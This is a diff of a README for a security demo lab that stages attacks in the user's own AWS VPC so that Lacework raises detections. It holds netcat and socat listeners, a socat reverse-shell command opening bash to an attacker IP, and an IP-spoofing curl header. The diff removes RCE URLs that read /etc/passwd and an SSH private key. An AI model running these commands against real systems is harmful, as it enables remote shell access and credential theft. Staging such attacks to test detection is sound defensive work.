@@ -1,19 +1,26 @@
-# 🧪 Attack Simulation Lab
+# 🧪 Welcome to the Attack Simulation Lab
 
-This demo simulates various types of attacks within your **own VPC environment**. It includes Remote Command Execution, Reflected XSS, IP Spoofing, and simulates known bad IP behavior. **For educational and demonstration purposes only.**
+This demo simulates various types of attacks within your **own VPC environment**. It includes Compromise Host (LW Composite alert), Remote Command Execution, XSS, IP Spoofing, and simulates known bad IP behavior. **This is only for educational and demonstration purposes only.**
 
 ![image](https://github.com/user-attachments/assets/16d33c34-aa16-4880-8544-c2d1c8d113e6)
 
+> ⚠️ **IMPORTANT:** All tests must be run within your **own VPC lab environment**. 
 
 ---
 
 ## 🛠️ Preparations
 
+### Git Clone the Demo Simulator repo
 git clone https://github.com/svuillaume/demo_simulator
 
-### 1. Launch Two VMs
+### 1. Launch Two VMs with Public IP assigned
 - **Attacker VM**
 - **Victim VM**
+
+### 2. Create an AWS ELB
+- **Create a new Target Group and Register Attack VM**
+
+Note: The above are intended for Lacework to detect these VM "Internet Exposure"
 
 ---
 
@@ -53,66 +60,62 @@ git clone https://github.com/svuillaume/demo_simulator
    ```bash
    python3 app.py
    ```
+6. **Deploy Lacework Agent**
+   ***Ideally enable AVD on the agent setup***   
 
 ---
 
-## ▶️ Running the Simulation
+# ▶️ Running the Simulation
 
-### On the Attacker VM (Open 2 Terminals or use screen)
+## On the Attacker VM (Open 2 Terminals or use screen)
 
-sudo apt install screen    # Debian/Ubuntu
-sudo yum install screen    # RHEL/CentOS
+1. **Create a persistent socket listener on Terminal 1 or screen 1:**
 
-
-**Create a persistent socket listener on Terminal 1 or screen 1:**
 ```bash
 nc -k -l 3333 &
 ```
-**Create a new socat tcp listener on tcp 5555**
+
+2. **Create a new socat tcp listener on tcp 5555**
 
 ```bash
 socat file:`tty`,raw,echo=0 tcp-listen:5555
 ```
-
-**Run traffic simulation with k6 on Terminal 2 or screen 2:**
+ 
+3. **Optionally run traffic simulation with k6 on Terminal 2 or screen 2:**
 ```bash
 sudo docker run --rm -v $(pwd):/scripts grafana/k6 run /scripts/k6.js
 ```
 
----
-
 ### On the Victim VM
 
-**Run the attack simulation script:**
-```bash
-./demo_simulator/lw_attack_sim.sh
-```
-
-**Intiate an interactive Reverse Shell**
+1. **Intiate an interactive Reverse Shell***
 ```bash
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
 ```
 ---
 
-## 🚀 HOWTO Use the Demo
+# 🚀 HOWTO run the Demo
+
+**On the Attacker VM**
+
+1. **Using the establisehd Reverse Shell Connection, Run the attack simulation script***
+
+```bash
+./demo_simulator/lw_attack_sim.sh
+```
+
+***Note: The script will run for 5 minutes*** 
+***On the Attacker VM, you can run K6.js script to generate traffic from all over the world (this is using the x-forward-for header)***
+
+---
 
 
-On the Attacker VM, run K6.js and owasp_attack.sh
-
-> ⚠️ **IMPORTANT:** All tests must be run within your **own VPC lab environment**.
+# Owasp Attacks: These are for your own inspiration
 
 ### 🔓 Remote Command Execution (RCE)
 
 Submit OS commands via the vulnerable Flask app:
 
-***(aws ALB) http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/***
-
-```bash
-http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20/etc/passwd
-```
-```bash
-http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20~/.ssh/id_rsa
-```
 ---
 
 ### 💬 Reflected XSS
@@ -156,6 +159,8 @@ curl -H "X-Forwarded-For: 1.2.3.4" http://<victim_IP>:5000/client-ip
 
 ---
 
-## ✅ You're now ready to simulate attacks!
+## ✅ Happy Demo!
+
 Happy testing — use responsibly in isolated environments.
+
 
